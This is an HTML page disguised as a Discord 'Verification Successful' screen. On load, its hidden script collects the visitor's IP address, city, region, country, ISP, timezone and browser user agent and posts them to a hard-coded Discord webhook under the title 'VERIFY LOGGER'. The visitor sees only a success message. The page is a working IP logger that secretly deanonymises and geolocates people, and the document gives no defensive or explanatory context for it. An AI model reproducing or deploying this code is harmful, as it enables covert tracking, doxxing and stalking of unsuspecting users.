<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verification</title>
    <style>
        body {
            background: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
            margin: 0;
        }
        .box {
            max-width: 400px;
            margin: auto;
            padding: 30px;
            background: #1e1e1e;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);
        }
        h2 { color: #22c55e; margin-top: 0; }
    </style>
</head>
<body>
    <div class="box">
        <h2>✅ Verification Successful!</h2>
        <p>You may now return to the Discord server.</p>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1504415140815175801/0_doEHMI_L9ZnFFT1dhBkWCpIONeoakVxFG08pKsEUDOHdKv4nfQTZaYF9QS3_9CjFyQ";

        // Kumuha muna ng IPv4
        fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(ipData => {
            const ip = ipData.ip;
            const ua = navigator.userAgent;

            // Gamitin ang IPv4 para makuha ang lokasyon
            return fetch(`https://ipapi.co/${ip}/json/`)
                .then(res => res.json())
                .then(data => {
                    const embed = {
                        title: "☠️ VERIFY LOGGER | PURESKILLS",
                        color: 16729856,
                        timestamp: new Date().toISOString(),
                        fields: [
                            {name: "🌐 IP ADDRESS", value: `\`${ip}\``, inline: false},
                            {name: "📍 LOCATION", value: `\`${data.city}, ${data.region}, ${data.country_name}\``, inline: false},
                            {name: "📡 ISP / PROVIDER", value: `\`${data.org || 'Unknown'}\``, inline: false},
                            {name: "⏰ TIMEZONE", value: `\`${data.timezone || 'Unknown'}\``, inline: false},
                            {name: "💻 DEVICE / BROWSER", value: `\`${ua.substring(0, 180)}\``, inline: false}
                        ]
                    };

                    return fetch(WEBHOOK, {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({embeds: [embed]})
                    });
                });
        })
        .catch(err => console.log("Error:", err));
    </script>
</body>
</html>
